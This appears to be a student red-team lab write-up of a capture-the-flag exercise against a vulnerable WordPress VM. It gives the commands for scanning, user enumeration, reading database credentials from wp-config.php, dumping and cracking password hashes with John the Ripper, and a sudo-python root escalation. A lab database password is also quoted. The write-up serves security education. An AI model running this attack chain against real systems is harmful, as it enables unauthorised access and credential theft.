# Red Team's Summary of Operations

### Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
_Nmap_ scan results for each machine reveal the below services and OS details:
- Command: `$ nmap -sV 192.168.1.0/24 |cat >> nmapscan.txt`
- Output: 
  
  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%201.%20NMAP%20scan-Discovery.PNG" width="500" height="600">
  
  Fig. 1: Network mapping with _Nmap_.
 
 From the scan, we are able to identify the target VM defined by the IP `192.168.1.110/24`.
 In order to find the detailed information and services related to port the following comad was used:
 
- Command: `$ nmap -T4 -A -v 192.168.1.110 |cat >> scan_target1.txt`
- Output: 
  
  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%202.%20NMAP%20scan-%20Port%20Discovery%20Of%20Target%201(192.168.1.110).png" width="500" height="600">
  
  Fig. 2: Detailed information gathering regarding `192.168.1.110/24` (ports, services and vulnerabilities).
  
  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%203.%20NMAP%20scan-%20Port%20and%20service%20Discovery%20Of%20Target%201(192.168.1.110).PNG" width="500" height="600">
  
  Fig. 3: Detailed information gathering regarding `192.168.1.110/24` (ports, services and vulnerabilities).
  
    <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%204.%20NMAP%20scan-%20Port%20and%20service%20Discovery%20Of%20Target%201(192.168.1.110).PNG" width="500" height="600">
  
  Fig. 4: Detailed information gathering regarding `192.168.1.110/24` (ports, services and vulnerabilities).
  
 Table 1: reconnaissance findings of the target `192.168.1.110`
  
| Open Ports | Services                         |
|------------|----------------------------------|
| 22         | SSH                              |
| 80         | HTTP                             |
| 111        | rpcbind                          |
| 139        | netbios-ssn Samba smbd 3.X - 4.X |
| 445        | netbios-ssn Samba smbd 3.X - 4.X |

### Critical Vulnerabilities

We decided to use two scanners for finding vulnerability in target `192.168.1.110/24`. They are:
- _Nikto_ (an open source vulnerability scanner)
- _WPScan_ (a balackbox security scanner)

_Nikto_ lists a number of vulnerabilities in `192.168.1.110`.
- Command: `$ nikto -h 192.168.1.110`
- Output: 
  
  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%205%20Nikto%20scan.PNG" width="500" height="300">
  
  Fig. 5: _Nikto_ revealing information about possible vulnerabilities.
  
  _Nikto_ reveals that:
  - the target is vulnerable to XSS.
  - the target is running Apache webserver.
  - the target is vulnerable to minor information disclousure vulnerability (OSVDB-3092)
  - the target is providing directory listing, i.e., which may allow an attacker to read arbitrary files which is akin to directory traversal attack. 

Based on these preliminary finding I will use another tool (_WPScan_) to get more information.
- Command: `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`
- Output: 

 
  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%206%20WPscan.PNG" width="500" height="300">
  
  Fig. 6: _WPScan_ revealing information about possible vulnerabilities.
  
  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%207%20WPscan2.PNG" width="500" height="300">
  
  Fig. 7: _WPScan_ revealing information about possible vulnerabilities.
  
  _WPScan_ reveals:
  - user identification. Two users are identified as **steven** and **michael**.  
  - user enumeration, i.e., brute-forcing user password is possible.

Next, I will combine _Nmap_ findings with _WPScan_ findings to SSH to the wordpress webserver(`192.168.1.110`). Before doing so, I will run a brute-force against **steven** and **michael**.
  
### Exploitation
 
Before brute-forcing, it was possible to guess **michael's** password. This allowed me to SSH to `192.168.1.110` as **michael** as shown in Fig. 8.
- Command: `$ ssh michael@192.168.1.110`
- Output: 

  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%209%20SSH2.PNG" width="500" height="400">
  
  Fig. 8: Attempt of SSH into `192.168.1.110` as **michael** is successful.
  
Now using previously gained knowledge, investigate the `/var/www/html/wordpress` directory for possible weak links in the wordpress webserver. The command `ls -l` lists all the files available in the `/var/www/html/wordpress` directory. However, `wp-config.php` seems to be the point of interest. Investigation of `wp-config.php` reveals an existance of MySQL database, where the username is **root** and password is **R@v3nSecurity** as shown in Fig. 9. 

- Command: `$ cat /var/www/html/wordpress/wp-config.php`
- Output: 

  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2011%20Finding%20SQL%20password.PNG" width="500" height="400">
  
  Fig. 9: Extracting information relating to MySQL.
  
In the next step, I will login to the MySQL database to further investigate.

- Commands: 
  - `$ mysql -u root -p`
  - `$ show databases;`
  - `$ use wordpress;`
  - `$ show tables;`
  - `$ SELECT * FROM wp_users;`
- Output: 

  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2013%20Finding%20SQL%20databases.PNG" width="500" height="300">
  
  Fig. 10: logging to MySQL database.
  
  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2014%20Finding%20WP%20Hashes.PNG" width="500" height="400">
  
  Fig. 11: Users' hashes located in the MySQL database.
 
`show tables` command provides a detailed output regarding stored tables in the `wordpress` database. However, `wp_users` is investigated for possible user information apart from the username. Fig. 11 shows that there are two hashed passwords registered in the database. 

In the next step, I exported those hashes to a text file named `wp_hashes1.txt`. This will allow me to crack the hashed password for the remaining user **steven** as shown in Fig. 13.
- Commands: 
  - `$ nano wp_hashes1.txt`
  - `$ cat wp_hashes1.txt`
  - `$ john wp_hashes1.txt`

- Output: 

  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2015%20retrieved%20hashes.PNG" width="500" height="75">
  
  Fig. 12: Exporting hashed passwords.

  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2016%20Cracking%20hashed%20password%20with%20John%20the%20Ripper.PNG" width="500" height="400">
  
  Fig. 13: Cracking **steven**'s hashed passwords.
  
In the next step, I will utilise this newly cracked password to SSH into **steven**'s account.
- Commands: 
  - `$ ssh steven@192.168.1.110`

- Output: 

  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2017%20SSH%20into%20steven.PNG" width="500" height="250">
  
  Fig. 14: SSH into **steven**'s account.

Since SSH is successful, the next step would be to perform privilege escalation. 

- Commands: 
  - `$ sudo -l`
  - `$ sudo python -c 'import pty;pty.spawn("/bin/bash")'`

- Output: 
  
  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2018.%20Performing%20Privilege%20Escalation.PNG" width="500" height="400">
  
  Fig. 15: Leveraging a _Python_ permission, the user **steven** escaletes its privilege to `root`.

It is eveident from Fig. 15 that **steven** has permision to excute _Python_ scripts which was revealed by the execution of `sudo -l` command. In the end, running  a simple _Python_ script as given by the command `sudo python -c 'import pty;pty.spawn("/bin/bash")'` was enough to gain a `root` shell.
   
### Deliverables

**Flag 1:**

<img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Flags/Flag1.PNG" width="500" height="400">
  
  Fig. 16: Flag 1 captured.

**Flag 2:**

<img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Flags/Flag%202.PNG" width="500" height="400">
  
  Fig. 17: Flag 2 captured.

**Flag 3:**

<img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Flags/Flag%203.2.PNG" width="500" height="400">
  
  Fig. 18: Flag 3 captured.

**Flag 4:**

<img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Flags/Flag%204.PNG" width="500" height="400">
  
  Fig. 19: Flag 4 captured.
